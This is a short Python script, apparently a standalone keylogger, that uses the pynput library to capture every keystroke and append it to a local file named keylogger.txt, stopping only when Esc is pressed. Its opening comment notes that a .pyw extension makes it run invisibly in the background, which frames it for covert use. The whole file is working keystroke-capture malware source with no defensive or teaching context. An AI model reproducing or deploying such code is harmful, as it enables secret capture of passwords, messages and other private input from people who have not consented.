# If extension is .py → runs with terminal
# If extension is .pyw → runs in background (invisible)

from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0
keys = []

# Add timestamp at the beginning of log
with open("keylogger.txt", "a") as f:
    f.write("Timestamp: " + str(datetime.now())[:19] + "\n")
    f.write("\n")

def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write("\n")
            elif "Key" not in k:
                f.write(k)

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 5:
        write_file(keys)
        keys = []
        count = 0

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    with open("keylogger.txt", "a") as f:
        f.write("\n\n")
        f.write("------------------------------------------------------------")
        f.write("\n\n")
